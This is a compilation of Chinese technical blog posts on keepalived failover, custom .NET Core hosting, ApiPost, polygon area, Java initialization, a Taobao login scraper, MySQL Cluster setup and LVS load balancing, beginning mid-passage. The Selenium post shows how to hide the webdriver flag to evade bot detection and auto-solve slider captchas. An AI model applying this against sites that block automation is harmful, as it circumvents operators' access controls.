if [ "${counter}" -eq 0 ]; then
    service keepalived stop
fi


chmod 755 chk_mysql.sh
启动keepalived服务。
master2
vi /etc/keepalived/keepalived.conf

! Configuration File for keepalived
       
global_defs {
notification_email {
ops@wangshibo.cn
tech@wangshibo.cn
}
       
notification_email_from ops@wangshibo.cn
smtp_server 127.0.0.1 
smtp_connect_timeout 30
router_id MASTER-HA
}
       
vrrp_script chk_mysql_port {
    script "/keepalived/chk_mysql.sh"
    interval 2            
    weight -5                 
    fall 2                 
    rise 1               
}
       
vrrp_instance VI_1 {
    state BACKUP
    interface eth2
    mcast_src_ip 10.1.80.114
    virtual_router_id 51    
    priority 99          
    advert_int 1         
    authentication {   
        auth_type PASS 
        auth_pass 1111     
    }
    virtual_ipaddress {    
        10.1.80.119
    }
      
track_script {               
   chk_mysql_port             
}
}


vi chk_mysql.sh

#!/bin/bash
counter=$(netstat -na|grep "LISTEN"|grep "3306"|wc -l)
if [ "${counter}" -eq 0 ]; then
    service keepalived stop
fi


chmod 755 chk_mysql.sh
查看网卡

********************************************************************************************************************************************************************************************************
编写自定义 .NET Core 主机以从本机代码控制 .NET 运行时
    自定义 .Net Core 主机运行.Net Core代码，以及控制运行时运行状态，是在.Net Core 高级运行环境以及定制.Net Host ,CLR 等必不可少的。
    这些设置包括为
 
    1.设置启动标志
使用服务器GC（ STARTUP_SERVER_GC），   
还是使用并发GC（STARTUP_CONCURRENT_GC），             
STARTUP_LOADER_OPTIMIZATION_MULTI_DOMAIN 最大化域中性加载        
STARTUP_LOADER_OPTIMIZATION_MULTI_DOMAIN_HOST 强名称程序集的域中立加载，
STARTUP_SINGLE_APPDOMAIN 所有代码都在默认的AppDomain中执行，
STARTUP_SINGLE_APPDOMAIN 所有代码都在默认的AppDomain中执行。
 
  2.以及设置AppDomain的运行方式
     APPDOMAIN_FORCE_TRIVIAL_WAIT_OPERATIONS 在等待期间不要抽取信息，     APPDOMAIN_SECURITY_SANDBOXED 导致不从TPA列表中的程序集作为部分受信任加载，     APPDOMAIN_ENABLE_PLATFORM_SPECIFIC_APPS 启用特定于平台的程序集，     APPDOMAIN_ENABLE_PINVOKE_AND_CLASSIC_COMINTEROP 允许从非TPA程序集进行PInvoking，     APPDOMAIN_DISABLE_TRANSPARENCY_ENFORCEMENT完全禁用透明度检查。
 
  3.主要步骤如下
 
（1）.利用LoadLibrary 加载CoreClr.DLL获取句柄
         

        HMODULE ret = LoadLibraryExW(coreDllPath, NULL, 0);

 
（2）.获取DLL里面的GetCLRRuntimeHost函数，通过这个函数找到IID_ICLRRuntimeHost4接口（宿主接口）
   

        ICLRRuntimeHost4* runtimeHost;
        FnGetCLRRuntimeHost pfnGetCLRRuntimeHost = (FnGetCLRRuntimeHost)::GetProcAddress(coreCLRModule, "GetCLRRuntimeHost");
        if (!pfnGetCLRRuntimeHost) { printf("ERROR - GetCLRRuntimeHost not found"); return -1; } 
        HRESULT hr = pfnGetCLRRuntimeHost(IID_ICLRRuntimeHost4, (IUnknown**)&runtimeHost);

 
 
（3）.设置启动标志

       hr = runtimeHost->SetStartupFlags(
       static_cast<STARTUP_FLAGS>(
       STARTUP_FLAGS::STARTUP_CONCURRENT_GC | STARTUP_FLAGS::STARTUP_SINGLE_APPDOMAIN | STARTUP_FLAGS::STARTUP_LOADER_OPTIMIZATION_SINGLE_DOMAIN ) );

 
 
（4）.启动Host
          

       hr = runtimeHost->Start();

 
（5）.设置AppDomain

       int appDomainFlags =
       APPDOMAIN_ENABLE_PLATFORM_SPECIFIC_APPS |           
       APPDOMAIN_ENABLE_PINVOKE_AND_CLASSIC_COMINTEROP |    
       APPDOMAIN_DISABLE_TRANSPARENCY_ENFORCEMENT;    

 
（6）.创建AppDomain
         

      hr = runtimeHost->CreateAppDomainWithManager( L"Sample Host AppDomain", appDomainFlags, NULL,NULL, sizeof(propertyKeys) , propertyKeys, propertyValues, &domainId);

 
（7）.运行托管代码
         

     DWORD exitCode = -1; hr = runtimeHost->ExecuteAssembly(domainId, targetApp, argc - 1, (LPCWSTR*)(argc > 1 ? &argv[1] : NULL), &exitCode);

 
简短几行代码就可以进行自托管（Java/.Net QQ 群：676817308）
********************************************************************************************************************************************************************************************************
利用ApiPost接口调试与文档生成工具，提升前、后端工作效率
什么是ApiPost？
场景1：
对于我们后端程序员，常常会写一些接口（APIs），但是在前端尚未调用之前，我们必须先自己测试下这个接口是不是正确返回了预定结果。对于一个GET请求的接口还好，我们可以直接用浏览器打开或者URL传参数查看结果，但对于POST、PUT、DELETE等接口就不能这样做了。
场景2：
对于一个程序员，最痛恨的莫过于2件事情：
1、痛恨自己写文档
2、痛恨不写文档的别人
这个时候，你需要ApiPost为您快速生成接口文档。

场景3：
对于一个App开发者或者一个前端，我们当然要看下后端返给我们的接口数据长什么样。当然，ApiPost就是干这件事的。
场景4：
对于一个功能测试人员，ApiPost同样拥有用武之地！
场景5：
作为一个技术经理，我们关心的无非就是2点：效率和管理。
ApiPost作为支持团队协作的接口管理工具，让同事们在调试接口的同时快速生成接口文档，时间节省一半，提升效率毋庸置疑；
同时，ApiPost的接口数据全部加密存储在云端，随时随地您都可以查看。即保证了数据安全性又省去了接口管理的大麻烦！
开始使用ApiPost！
说了这么多，现在来分享下如何使用ApiPost发送各种请求吧。
1、下载
ApiPost官方提供chrome插件、window客户端、mac客户端下载，最好在ApiPost的官网下载。不过个人建议安装客户端。使用更灵活。亲自试了下，在线版返回的测试响应数据和客户端稍有不同。
下载地址：https://www.apipost.cn/#downlaod
 
2、安装
客户端傻瓜式安装，没啥说的。
如果你执意安装chrome插件又不想因为不可描述的原因fanq，那么你可以参考官方网站上的chrome本地安装教程。
3、模拟发送请求（支持文件上传）
我们先写个简单的后端接口接受各种数据

接下来开始apipost的测试了。
先进去apipost，首次需要注册一个账号，登陆后，会弹出一个【创建项目】的弹窗，填入您的项目名称（自定义，最好有意义比如：春节抢五福 项目）。这里我们输入【测试项目】（职业程序员，就是喜欢动不动就「测试XX」……）

创建项目后，就可以，测试接口了。
文笔不好啊，不吧啦吧啦了，下面1张图全部搞懂。

点击发送就会看到响应数据了。
4、保存，生成文档
最后别忘了【保存】。保存后就可以，查看您的文档了。

5、团队协作
当然，ApiPost更强大的地方在于它的团队协作功能。老板再也不用担心技术的同学效率低啦。
具体我就不细说了。毕竟这个也太容易看懂，没什么说的了。

********************************************************************************************************************************************************************************************************
利用python计算多边形面积
最近业务上有一个需求，给出多边形面积。
Google了一下，发现国内论坛给的算法都是你抄我我抄你，也不验证一下是否正确，
从 博客园到csdncsdn
然后传播到国内各个角落。。。真是无力吐槽了。
直接纯英文Google。发现了一个非常快捷的面积算法。直接附上链接 
鞋带公式
 
这个算法，算面积是不是就很简单了：

def polygon_area(points):
    """返回多边形面积

    """
    area = 0
    q = points[-1]
    for p in points:
        area += p[0] * q[1] - p[1] * q[0]
        q = p
    return area / 2


　　
********************************************************************************************************************************************************************************************************
【软件构造】-<笔记>-浅谈java中类的初始化过程
编写java程序时，每创建一个新的对象，都会对对象的内容进行初始化。
每一个类的方法中的局部变量都有严格的初始化要求，因此假如写出下面的程序：

void f(){
    int i;
    i++;  
    }

编译时就会得到一条出错信息，因为java会严格检查方法内部局部变量的初始化，正如《java编程思想》中所说“未初始化的局部变量更有可能是程序员的疏忽”
但是对于类内部的字段，java并不会严格检查字段是否初始化，因为类的每一个基本数据类型成员都保证会有一个初始值，哪怕构造器什么都没做。
其实一个对象的初始化并不仅仅只是简单的调用构造器，在这之前，java已经做了很多工作了。
 
创建一个新的对象，就相当于苹果树上长出了一个新的苹果。只有在这个苹果长出来的时候，我们才知道其具体的形状，颜色，重量，这是每个苹果所具有的特性，这些特性就相当于对象中的字段。但是所有的苹果同样具有共性，比如说都具有类似的结构，这些性质就相当于对象中的static字段，是所有该类对象所共享的。而构造器，就相当于在采摘下苹果之后，通过人工的手段对其特性做出一些改变。
 
 
当java要创建一个新的对象时，首先会查找类路径，找到对应的类，相当于我们种下了一颗苹果树。
此时java会载入这个类，此时类中有关静态初始化的所有动作都会被执行，即类中带有static前缀的字段会被分配内存，然后进行初始化的赋值。无论为这个类new多少个对象，static字段的初始化在整个程序的生命周期中只会进行一次，且有自己独立的内存位置，为所有该类的对象所共享。就像我们知道这棵种下的苹果树会长出的东西叫做苹果，和世界任何一个地方的同类的苹果树一样，虽然苹果还没有长出来，但是它作为苹果所具有的性质是客观存在的。
//例子
如果当前类是导出类，那么java编译器就会从其基类开始加载，分别初始化其中的静态域；
无论如何，static域的初始化都只会进行这一次。
 接下来，java编译器就会为该具体的对象分配内存空间。内存被分配的时候，对应的内存空间会被全部清0，所以所有的非static字段的初始值都是0或者与0等价的值，对象的引用都被置为null。这就相当于苹果树的果实刚刚准备生长的状态，一切都是最初的模样。
下一步，java编译器就会利用每个字段的初始化语句对字段进行赋值，如果初始化语句调用了别的对象或者方法，那么编译器也会不知疲倦的去找，就是为了保证在调用构造器之前，字段的初始化语句都执行完成。值得注意的是，类中字段的分配内存空间与赋值的过程是先于构造器以及其他方法进行的，与代码中初始化语句与方法的排列顺序无关，哪怕包括构造器在内的所有方法都排在字段初始化语句之前，编译器也会跳过这些方法，先执行初始化语句。
如果当前类是导出类，那么java编译器就会从其基类开始执行字段的初始化，逐步向外进行，导出类的加载与初始化赋值都必须在基类的基础上进行，不能凭空产生。
这个赋值的过程就相当于苹果树的果实的生长过程，苹果的大小，重量，颜色等特性都是在这个过程中慢慢形成的。
 
接下来才轮到构造器对对象进行初始化，按照new对象时输入的参数对每个对象进行塑造，这个过程就相当于苹果采摘完成之后，清洗干净，修剪枝叶。
测试代码如下：

 1 public class init_Test {
 2     public static void main(String args[]) {
 3         System.out.println("the first code in main");
 4     }
 5     static apple apple1=new apple();
 6     static apple apple2=new apple();
 7 }
 8 
 9 class Test{
10     static int f(String words) {
11         System.out.println(words);
12         return 1;
13     }
14 }
15 
16  class apple{
17     int value1 =Test.f("init value1");
18     static int static1=Test.f("static init static1");
19     apple(){
20         System.out.println("constructor of class apple");
21         System.out.println("check static1 ="+static1);
22         System.out.println("check static2 ="+static2);
23         System.out.println("check static3 ="+static3);
24         System.out.println("check value1 ="+value1);
25         System.out.println("check value2 ="+value2);
26         System.out.println("check value3 ="+value3);
27     }
28     int value2=Test.f("init value2");
29     static int static2=Test.f("static init static2");
30     static int static3;
31     int value3;    
32 }

产生的输出如下：

static init static1static init static2init value1init value2constructor of class applecheck static1 =1check static2 =1check static3 =0check value1 =1check value2 =1check value3 =0init value1init value2constructor of class applecheck static1 =1check static2 =1check static3 =0check value1 =1check value2 =1check value3 =0the first code in main












接下来让我们捋清楚这段代码的执行过程。
首先进入程序的入口：main方法
要执行main方法，就需要首先加载main方法所在的init_Test类。

加载时会对static域进行初始化，因此控制流会跳过main方法，首先执行下面的两条初始化语句，对静态的apple1和apple2进行初始化。也就是创建两个新的apple对象。
初始化调用了apple方法，因此控制流会转而寻找apple类，这是控制流第一次到达该类，于是就会对其中的静态域进行初始化：

也就是上图所示的static1，static2，static3三个变量。
初始化调用了以下静态方法，定义该方法的目的就是在控制台中打印信息。

注意到控制台中的前两条输出：

===============================================================
完成了类的加载，就开始创建具体的对象了，此时控制流开始为apple1对象创建内存空间，非static域首先被赋值为0，然后执行对应的初始化语句；

执行完之后，终于进入构造器，执行构造器内的初始化语句；
控制台产生如下输出：

然后执行构造其中的剩下语句，将apple1中的各个字段的值打印出来：

其中的static3与value3没有指定初始值，因此默认为0；
会到main方法，终于完成了apple1对象的创建，开始执行apple2的创建：

控制台中的输出：

最后，终于执行到了main方法的第一条语句，实属不易：

通过上述例子，可以对java中的初始化过程做出一个总结：

构造器的构造过程涉及更复杂的知识，本菜鸡还没有学到，等后面学习了相应的知识再进行补充；
由于刚刚接触java，文章中错误不少，求看官大佬指正；
********************************************************************************************************************************************************************************************************
selenium跳过webdriver检测并模拟登录淘宝

    目录
    
        
        简介
        编写思路
        使用教程
        演示图片
        源代码
        
        
    

@(文章目录)
简介
模拟登录淘宝已经不是一件新鲜的事情了，过去我曾经使用get/post方式进行爬虫，同时也加入IP代理池进行跳过检验，但随着大型网站的升级，采取该策略比较难实现了。因为你使用get/post方式进行爬取数据，会提示需要登录，而登录又是一大难题，需要滑动验证码验证。当你想使用IP代理池进行跳过检验时，发现登录时需要手机短信验证码验证，由此可以知道旧的全自动爬取数据对于大型网站比较困难了。
selenium是一款优秀的WEB自动化测试工具，所以现在采用selenium进行半自动化爬取数据，支持模拟登录淘宝和自动处理滑动验证码。
编写思路
由于现在大型网站对selenium工具进行检测，若检测到selenium，则判定为机器人，访问被拒绝。所以第一步是要防止被检测出为机器人，如何防止被检测到呢？当使用selenium进行自动化操作时，在chrome浏览器中的consloe中输入windows.navigator.webdriver会发现结果为Ture，而正常使用浏览器的时候该值为False。所以我们将windows.navigator.webdriver进行屏蔽。
在代码中添加：
        options = webdriver.ChromeOptions()
        # 此步骤很重要，设置为开发者模式，防止被各大网站识别出来使用了Selenium
        options.add_experimental_option('excludeSwitches', ['enable-automation']) 
        self.browser = webdriver.Chrome(executable_path=chromedriver_path, options=options)
同时，为了加快爬取速度，我们将浏览器模式设置为不加载图片，在代码中添加：
        options = webdriver.ChromeOptions()
        # 不加载图片,加快访问速度
        options.add_experimental_option("prefs", {"profile.managed_default_content_settings.images": 2}) 
至此，关键的步骤我们已经懂了，剩下的就是编写代码的事情了。在给定的例子中，需要你对html、css有一定了解。
比如存在以下代码：
        self.browser.find_element_by_xpath('//*[@class="btn_tip"]/a/span').click()
        taobao_name = self.wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '.site-nav-bd > ul.site-nav-bd-l > li#J_SiteNavLogin > div.site-nav-menu-hd > div.site-nav-user > a.site-nav-login-info-nick ')))
        print(taobao_name.text)
第1行代码指的是从根目录(//)开始寻找任意(*)一个class名为btn_tip的元素，并找到btn_tip的子元素a标签中的子元素span
第2行代码指的是等待某个CSS元素出现，否则代码停留在这里一直检测。以.开头的在CSS中表示类名(class)，以#开头的在CSS中表示ID名(id)。A > B，指的是A的子元素B。所以这行代码可以理解为寻找A的子元素B的子元素C的子元素D的子元素E出现，否则一直在这里检测。
第3行代码指的是打印某个元素的文本内容
使用教程

点击这里下载下载chrome浏览器
查看chrome浏览器的版本号，点击这里下载对应版本号的chromedriver驱动
pip安装下列包

[x] pip install selenium

点击这里登录微博，并通过微博绑定淘宝账号密码
在main中填写chromedriver的绝对路径
在main中填写微博账号密码


    #改成你的chromedriver的完整路径地址
    chromedriver_path = "/Users/bird/Desktop/chromedriver.exe" 
    #改成你的微博账号
    weibo_username = "改成你的微博账号"
    #改成你的微博密码
    weibo_password = "改成你的微博密码"
    
演示图片

图片查看不了点击这里
源代码
项目源代码在GitHub仓库
项目持续更新，欢迎您star本项目
********************************************************************************************************************************************************************************************************
linux下构建MysqlCluster集群，NDB搜索引擎
搭建管理节点
Ndb搜索引擎对于服务器的内存要求比较高，因为所有数据节点的数据，以及索引，事务等等都需要加载进内存中。
下载 mysql-cluster-gpl-7.6.8-linux-glibc2.12-x86_64.tar.gz 集群压缩包上传至服务器，解压，这里说明一下文件解压后会比较大，尽量增大服务器的磁盘空间。
取出解压文件中的ndb_mgm文件拷贝到/usr/local/bin目录下 \cp -rf  mysql-cluster-gpl-7.6.8-linux-glibc2.12-x86_64/bin/ndb_mgm*   /usr/local/bin
赋予ndb_mgm可执行权限
创建 /var/lib/mysql-cluster文件夹
创建 /usr/local/mysql文件夹
创建 config.ini管理节点配置文件
例如：
[ndbd default]NoOfReplicas=2DataMemory=6GIndexMemory=1GMaxNoOfConcurrentTransactions=10240MaxNoOfConcurrentOperations=100000MaxNoOfOrderedIndexes=10000NoOfFragmentLogFiles=128TimeBetweenLocalCheckpoints=20FragmentLogFileSize=256MRedoBuffer=64MTransactionDeadlockDetectionTimeout=15000[MYSQLD DEFAULT][NDB_MGMD DEFAULT][TCP DEFAULT]
[ndb_mgmd]NodeId=1HostName=***.***.***.***DataDir=/var/lib/mysql-cluster
[ndb_mgmd]NodeId=2HostName=***.***.***.***DataDir=/var/lib/mysql-cluster
[ndbd]NodeId=10HostName=***.***.***.***DataDir=/var/opt/mitec/mysql/data/
[ndbd]NodeId=11HostName=***.***.***.***DataDir=/var/opt/mitec/mysql/data/
[ndbd]NodeId=12HostName=***.***.***.***DataDir=/var/opt/mitec/mysql/data/
[ndbd]NodeId=13HostName=***.***.***.***DataDir=/var/opt/mitec/mysql/data/
[mysqld]NodeId=30HostName=***.***.***.***
[mysqld]NodeId=31HostName=***.***.***.***
[mysqld]NodeId=32HostName=***.***.***.***
[mysqld]NodeId=33HostName=***.***.***.***
[mysqld][mysqld]
上面的配置是比较好的，对于中小型企业的业务量完全能吃的消百万级数据量完全够用，NoOfReplicas参数最大为4最小为2，这个参数代表数据节点的相互备份数。越大的话对于程序本身也是一种资源消耗。数据节点的数量必须能被NoOfReplicas参数整除，因为这个地方涉及到分区，有兴趣的小伙伴可以进一步了解。
config.ini文件配置完成后，将其拷贝到/var/lib/mysql-cluster文件夹下然后就可以进行管理节点的初始化了
首次初始化执行：ndb_mgmd -f  /var/lib/mysql-cluster/config.ini --initial 。下次启动管理节点就不需要加 --initial参数。这里说明以下如果是两个管理节点话：主管理节点执行前面的命令，备管理节点执行：ndb_mgmd -c '主管理节点ip' --ndb-nodeid=2 --configdir=/var/lib/mysql-cluster
mysqlCluster提供监控集群状态的客户端：在sshd客户端执行：ndb_mgm命令， 使用show命令查看集群状态，这里客户端有重启数据节点，管理节点等命令，例如：‘节点id’ restart / '节点id' stop
修改config.ini配置文件可以使用（主）管理节点 ndb_mgmd -f  /var/lib/mysql-cluster/config.ini --reload重新加载配置文件。
搭建sql节点
首先校验当前服务器是否有libaio-0.3.107-10.el6.x86_64.rpm，numactl-2.0.9-2.el6.x86_64.rpm包，没有的话yum安装一下，这两个包是支持mysql安装时用的。
创建mysql用户组，执行：groupadd mysql
创建mysql用户，执行：useradd -g mysql -s /bin/false mysql
创建安装目录：/var/opt/mitec/mysql。这个目录是可以自己指定的，这个目录的磁盘空间一定要大，最小15G，不然数据一多就宕机了。
赋予目录可执行权限：chown root:mysql ：/var/opt/mitec/mysql
解压mysql-cluster-gpl-7.6.8-linux-glibc2.12-x86_64.tar.gz集群压缩包，解压目录至：/usr/local
创建mysql配置文件：执行  vi /etc/my.cnf 命令
my.cnf 文件 例如：
[mysqld]ndbclusterbasedir=/var/opt/mitec/mysqldatadir=/var/opt/mitec/mysql/datandb-connectstring=‘管理节点ip（多个管理节点以   ，分割）’default-storage-engine=NDBCLUSTERquery_cache_size=512Mkey_buffer_size=384Mmax_allowed_packet=128Msort_buffer_size=6Mread_buffer_size=6Msql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES
[mysql_cluster]ndb-connectstring=‘管理节点ip（多个管理节点以   ，分割）’
上述配置文件完成后开始初始化mysql服务
/var/opt/mitec/mysql/bin/mysqld --initialize ，这里时mysql5.7初始化，其他版本的自行查找资料，初始化完成后控制台会有产生一个随机密码，登录mysqli修改mysql密码配置远程登录就会用到这个密码。
赋予mysql用户权限 给mysql相关文件增加权限
chown -R root /var/opt/mitec/mysql
chown -R mysql /var/opt/mitec/mysql/data
chgrp -R mysql /var/opt/mitec/mysql
将mysql加入开机自起
cp -rf /var/opt/mitec/mysql/support-files/mysql.server /etc/rc.d/init.d/mysql
#改变mysql启动文件权限	chmod +x /etc/rc.d/init.d/mysql
chkconfig --add mysql
ln -s /var/opt/mitec/mysql/bin/mysql /usr/bin
启动msyql服务即可
搭建数据节点
 这里我是将数据节点与mysql节点安装在了同一台服务器上
上述my.cnf配置文件中的
[mysql_cluster]ndb-connectstring=‘管理节点ip（多个管理节点以   ，分割）’
是配置数据节点与管理节点之间的连接，也就是配置当前数据节点是否为集群的数据节点。
直接执行：/var/opt/mitec/mysql/bin/ndbd --initial 命令。数据节点初始化时需要将 --initial参数带上，初始化后在启动数据节点就不需要加上 --initial参数。
到这里整个集群就相当于搭建完成，登录管理节点客户端查看各各节点状态。
附录：
mysqlcluster集群也提供了数据备份数据恢复等功能，以及滚动添加数据节点，这个可以参考mysqlCluster官网进行操作。
管理节点的config.ini文件内部有很多的参数，参数很重要，参数配置的不正确会导致集群很不友好，会有很多错误产生。
我现在搭建的集群数据库表为内存表，也可以创建磁盘表。这个地方就需要根据需求而定。
 
 
集群节点的初始化顺序：管理节点初始化，数据节点初始化，sql节点初始化。
集群节点的关闭顺序：sql节点关闭，数据节点关闭，管理节点关闭。
 
如要转发请指明出处，谢谢！
********************************************************************************************************************************************************************************************************
LVS负载均衡原理
一、LVS基本原理概述
　　LB集群的实现，LB即负载均衡集群
　　　　硬件：F5 BIG-IP,Citrix NetScaler,A10,Array,Redware
　　　　软件：Lvs，nginx，haproxy，ats，perlbal，httpd，varnish
　　　　基于工作的协议层次划分：
　　　　　　传输层：
　　　　　　　　lvs没有上线，haproxy3万并发极限（mode-tcp）
　　　　　　应用层
　　　　　　　　haproxy，nginx，ats，perlbal
 
 
　　1、背景
　　　　可以参考中文官方文档http://www.linuxvirtualserver.org/zh/lvs1.html
　　　　　　　　英文官方文档http://www.linuxvirtualserver.org/Documents.html
　　　　　　　　参考骏马金龙博客http://www.cnblogs.com/f-ck-need-u/p/7576137.html
　　2、简介
　　　　lvs（linux virtual server），linux虚拟服务器，是一个虚拟的四层交换器集群系统，根据目标地址和目标端口实现用户请求转发，本身不产生流量，只做用户请求转发，目前是负载均衡性能最好的集群系统，那么负载均衡实现了很好可伸缩性，节点数目可以增长到几千，甚至几万。后期也由很多用户参与开发LVS辅助工具和辅助组件，最出名的就是alexandre为LVS编写的keepalived，它最初专门用于监控LVS，之后又加入VRRP实现高可用功能。
　　　　负载调度器，真实服务器群节点一起被称为LVS，LVS负载调度器（有时也称为负载均衡器），接收服务的所有接入服务集群的请求，并决定集群中的哪个节点应该回复其请求。
　　　　1）、负载调度器（director）：作为整个集群的前端，主要将用户请求分发至真实服务器中进行处理。
　　　　2）、真实服务器池：由多个功能相同的真是服务器组成，为用户提供真正的网络服务，如web服务，邮件服务等。且虚拟服务器集群作为一个可伸缩的集群，可自由添加深处真是服务器而并步影响整个集群的正常工作。
　　　　3）、共享存储：作用就是让每个用户访问的资源都是一样的，服务器支持写操作，才建议使用
　
　　3、常用名词备注
　　　　VS:virtual server,虚拟服务器，也叫Director
　　　　RS：real server，真正的服务器，集群中的节点
　　　　CIP：客户端IP
　　　　VIP：virtual IP，director向外部提供服务的IP
　　　　RIP：realserver集群节点的服务器网卡IP
　　　　DIP:director与RS通信的IP

　　4、LVS框架
　　　　在1998年5月，章文嵩成立了Linux Virtual Server的自由软件项目，进行Linux服务器集群的开发工作。同时，Linux Virtual Server项目是国内最早出现的自由软件项目之一。
　　　　Linux Virtual Server项目的目标 ：使用集群技术和Linux操作系统实现一个高性能、高可用的服务器，它具有很好的可伸缩性（Scalability）、可靠性（Reliability）和可管理性（Manageability）。
　　　　目前，LVS项目已提供了一个实现可伸缩网络服务的Linux Virtual Server框架，下图所示。在LVS框架中，提供了含有三种IP负载均衡技术的IP虚拟服务器软件IPVS、基于内容请求分发的内核Layer-7交 换机KTCPVS和集群管理软件。可以利用LVS框架实现高可伸缩的、高可用的Web、Cache、Mail和Media等网络服务；在此基础上，可以开 发支持庞大用户数的、高可伸缩的、高可用的电子商务应用。
　　　　LVS是四层（传输层tcp/vdp），七层（应用层）的负载均衡工具，用的最多的是就是四层负载均衡功能的ipvs，七层的内容分发负载ktcpvs（kenrnel tcp virtual server）,基于内容的调度，因为应用层交换处理复杂，但伸缩性有限，目前还不成熟
　　　　　　ipvs是集成在内核中的框架，ipvs是真正生效实现调度的代码，可以通过用户空间的程序ipvadm工具来管理，该工具可以定义一些规则来管理内核中的ipvs，就像iptables和netfilter的关系一样。
　　　　　　ipvadmin，工作在用户空间，负责ipvs内核框架编写规则，定义谁是集群服务，而谁是后端真实的服务器（Real Server）
 
 　　
　
　　5、LVS集群的类型，支持的几种模式
　　　　在LVS集群中，集群是一个整体，通过负载均衡调度器（director）作为外部通信的中介，因此如何将外部请求转发到内部真是服务器的方式对LVS集群分类，LVS四种方式：网络地址转换（LVS-NAT），直接路由（LVS-DR）,IP隧道（LVS-TUN）、LVS-FULLNAT，一个负载均衡器上可以实现多种转发方式，一般用一种方式即可。
　
 
二、LVS集群架构图示
　　
 
　　1、用户访问从CIP到达VIP
　　2、负载均衡器DIP到达交换/路由器
　　3、最后到达后端的RIP真实的服务器
 
三、LVS在内核中的过程
 
 
　　
 
 
　　1、当用户向负载均衡调度器（Director Server）发起请求，调度器将请求发往内核空间。
　　2、PREROUTING链收到用户请求，判断目标IP确定是本机IP，将数据包发往INPUT链。
　　3、IPVS工作在INPUT链上，当用户请求到达INPUT时，IPVS会将用户请求和自己已定义好的集群服务进行对比，如果用户请求的就是定义的集群服务，那么IPVS会强行修改数据包里的目标IP地址及端口，并将新的数据包发往POSTROUTING链。
　　4、POSTROUTING链接收数据包后发现目标IP地址刚好时自己的后端服务器，那么此时通过选路，将数据包最终发送给后端的服务器。
 四、内核空间和用户空间的交互
　　
　　　　
　　　ipvsadmin定义lvs服务监听的ip和port，并发送给ipvs，而ipvs是工作在netfilter的input钩子上的程序，当input链中有目标ip属于lvs服务的请求报文时，ipvs就会修改该报文的链路，使其不进入用户空间而直接转到postrouting链上，并转发给其中一台real server。
 
 五、LVS 4种工作模式介绍
　　
　　1、lvs-nat 网络地址转换模式
　　大多数商品化的IP负载均衡硬件都是使用此方法，如Cisco的LocalDirector、F5的Big/ip。详细介绍4个步骤如下：
　　　　1）客户端发送请求到达director
　　　　2）director根据负载均衡算法改写目标地址为后端的RIP并转发给该后端主机，和NAT一样
　　　　3）当后端主机（RS）处理完请求后，将响应数据交给director
　　　　4）Director改写源地址为VIP后传给客户端

　　　　
　　　关于这种模式
　　　　1、RIP和DIP一般处于同一私有网段中。但并非必须，RS的网关要指向DIP，这样能保证将响应数据交给Director
　　　　2、支持端口映射，可修改请求报文的目标端口；
　　　　3、VS/NAT模式的最大缺点使Director负责所有进出数据：不仅处理客户端发起的请求，还负责将响应传输给客户端。而响应数据一般比请求数据大得多，调度器Director容易出现瓶颈。（也就是像7层负载的处理方式一样，但却没有7层负载那么多功能）
　　　　4、vs必须使linux系统，RS可以是任何系统
　　　缺点：在整个过程中，所有输入输出的流量都要经过LVS调度器，调度器网络I/O压力就会非常大，因此很容易称为瓶颈，特别使对请求流量很小，而响应流量很大的web类应用来说更为如此；
　　　优点：NAT模式配置管理简单，由于使用了NAT技术，LVS调度器及应用服务器可以在不同网段中，网络架构灵活，应用服务器只需要进行简单的网络设定即可加入集群。
 
　　2、lvs-dr 直接路由模式
 　　　　1）、客户端发送请求到达director，也就是CIP:VIP ；
　　　　 2）、director将请求报文重新封装一个mac地址首部dip-mac：rip-mac,所以DIP和RIP需要相同的物理网络实现arp通信,源IP地址和目标IP地址不变，只是修改源mac地址为DIP的mac地址，目标mac地址改为RIP的mac地址；然后发送给RS；
　　　　 3）、RS发现目标地址是自己的MAC地址处理报文，并且RS本地会还接口Lo配置为VIP，响应报文从Lo的VIP发送给eth0网卡，所以响应报文首部cip-mac:Lo-mac，最后响应报文直接发送给客户端，此时源ip地址为VIP，目标地址为CIP;
　　　　　　注意：RS，director都有VIP，所以要确保请求报文只发送到director，常见的方法修改RS的内核参数arp_ignore、arp_announce设置为1，使RS不影响其他主机的ARP通信。
　　　
　　　　 

　　　　　关于这种模式：
　　　　　　1）确保前端路由器将目标ip为vip的请求报文发往director
　　　　　　　　a、在前端网关做静态绑定；
　　　　　　　　b、在RS上使用arptables；
　　　　　　　　c、在RS上修改内核参数以限制arp通告即应答级别；
　　　　　　　　　　arp_announce
　　　　　　　　　　arp_ignore
　　　　　　2）、RS的RIP可以使用私网或公网地址；
　　　　　　3）、RS跟director在同一物理网络；
　　　　　　4）、请求报文经由director，响应报文直接发往client；
　　　　　　5）、此模式不支持端口映射；
　　　　　　6）、RS支持大多数的OS；
　　　　　　7）、RIP的网关不能指向DIP，以确保响应报文不经由director；
　　　　　　
　　　　　缺点：LVS调度器及应用服务器在同一个网段中，因此不能实现集群的跨网段应用。
　　　　　优点：直接路由转发，通过修改请求报文的目标mac地址进行转发，效率提升明显
 
   　3、lvs-tun IP隧道模式
 　　　　1）、客户端将请求发送前端的负载均衡器，请求报文源地址是CIP，目标地址为VIP。
　　　　 2）、负载均衡器收到报文后，发现请求的在规则里面存在的地址，它将请求报文的首部再封装一层IP报文，将源地址改为DIP，目标地址改为RIP，并将此包发送给RS;
　　　　 3）、RS收到请求报文后，会首先拆开第一层封装，然后发现里面还有一层IP首部的目标地址是自己Lo接口上的VIP，所以会再次处理请求报文（这种2次分装解封装的过程，就称为隧道模式）并将响应报文通过Lo接口送给eht0网卡然后直接发给客户端，这种模式也是需要设置Lo接口为VIP，并且不能在公网上

　　　　
 　　　　关于这种模式：
　　　　　　1）、DIP、VIP、RIP、都应该是公网地址；
　　　　　　2）、RS的网关不能指向DIP；
　　　　　　3）、请求报文要经由Director，响应报文不经由director；
　　　　　　4）、不知道端口映射
　　　　　　5）、RS的操作系统需要支持隧道功能
　　　　缺点：需要租用大量IP，特别是后端服务器使用较多的情况下
　　　　优点：LVS调度器将TCP/IP请求重新封装发给后端服务器，后端应用服务器之间通过IP隧道来进行转发，可以存在于不同的网段中
　　4、lvs-fullnat 
　　　　1）、客户端对VIP发起请求；
　　　　2）、director接收请求，发现是请求后端集群，对请求报文做full nat，源IP改为DIP，目标IP转换为任意后端RS的RIP，然后发往后端；
　　　　3）、RS收到请求后，进行响应，源IP为RIP，目标IP为DIP，内部路由到director；
　　　　4）、director收到响应报文后，进行full nat，源地址改为VIP，目标地址改为CIP；
 
 
 
